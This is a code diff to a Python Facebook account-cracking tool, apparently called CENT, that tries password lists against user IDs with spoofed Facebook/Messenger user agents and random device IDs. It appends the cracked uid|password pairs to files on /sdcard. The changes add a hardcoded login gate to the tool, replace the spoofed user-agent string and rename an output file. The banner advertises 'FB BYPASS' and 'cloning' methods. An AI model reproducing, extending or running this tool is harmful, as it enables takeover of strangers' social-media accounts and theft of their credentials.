@@ -12,7 +12,25 @@ except ModuleNotFoundError:
 	print('\n Installing missing modules ...')
 	os.system('pip install requests bs4 futures==2 > /dev/null')
 	os.system('python CENT.py')
-	
+	os.system('pip install espeak')
+def clear():
+	os.system('clear')
+
+	import getpass
+
+attemps = 0
+
+while attemps < 12345677901:
+    username = input(' \033[0;92mEnter Username: ')
+    password = input(' \033[0;93mEnter Password: ')
+
+    if username == 'centsu' and password == '5256':
+        print(' \033[0;92mYou Have Successfully Logged in.')
+        break
+    else:
+        print(' Incorrect Pass Please Trying ')
+        attemps += 1
+        continue	
 print('[•] TOOL LOADING')
 
 
@@ -157,7 +175,7 @@ logo=("""
  [\033[1;32m*\033[1;37m] Author   : CENT
  [\033[1;32m*\033[1;37m] Facebook : CENT
  [\033[1;32m*\033[1;37m] Tool     : FREE
- [\033[1;32m*\033[1;37m] FB BYPASS  : Active version : 0.0.1
+ [\033[1;32m*\033[1;37m] FB BYPASS  : Active version : {W}0.0.1
 \033[1;37m--------------------------------------------------
  [\033[1;32m*\033[1;37m]\033[1;33mYOUR ACCOUNTs ARE SAVE IN:\033[1;32m/sdcard/CENT-OK.txt\033[1;37m
 \033[1;37m--------------------------------------------------""")
@@ -227,7 +245,7 @@ def menu():
 				clear()
 				print(' All method working ')
 				linex()
-				print(' [1] METHOD (WIFI-CLONING)')
+				print(' [1] METHOD (WIFI-CLONING-MAINTENANCE)')
 				print(' [2] METHOD (For-Mobile-Data)')
 				linex()
 				mthd=input(' Choose: ')
@@ -548,7 +566,7 @@ def api2(ids,names,passlist):
                         en = random.choice(['en_US','en_GB'])
                         cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                         network = random.choice(['Zong','null','Marshmallow','Telekom China'])
-                        ua ='Davik/2.1.0 (Linux; U; Android 7.0.0; MMB29K Build/GT-P5100 [FBAN/FB4A;FBAV/241.0.0.41292;FBBV/975202462;FBDM/{density=2.75,width=720,height=9398};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.mlite;FBDV/MMB29K;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]'
+                        ua ='Dalvik/2.1.0 (Linux; U; Android 10; SM-N975U Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/253.0.0.17.117;FBPN/com.facebook.orca;FBLC/en_US;FBBV/200372525;FBCR/U.S. Cellular;FBMF/samsung;FBBD/samsung;FBDV/SM-N975U;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.5,width=1440,height=2759};FB_FW/1;] FBBK/1'
                         random_seed = random.Random()
                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                         device_id = str(uuid.uuid4())
@@ -687,7 +705,7 @@ def CENT4(ids,passlist):
                                 if uid in oks:pass
                                 else:
                                         print('\r\r\033[1;33m [CENT-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/CENT-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/CENT-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
